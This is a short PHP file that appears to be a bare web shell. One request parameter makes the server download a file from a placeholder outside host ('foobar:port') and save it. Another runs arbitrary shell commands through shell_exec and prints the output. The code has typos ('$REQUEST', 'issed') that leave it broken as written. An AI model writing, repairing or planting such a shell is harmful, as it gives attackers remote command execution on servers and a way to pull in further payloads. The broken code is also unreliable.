<?php
if (isset($_REQUEST['fupload'])) {
	file_put_contents($REQUEST['fupload'], file_get_contents("http://foobar:port/" . $REQUEST['fupload']));
}
if (issed($_REQUEST['fexec'])) {
	echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
}


?>
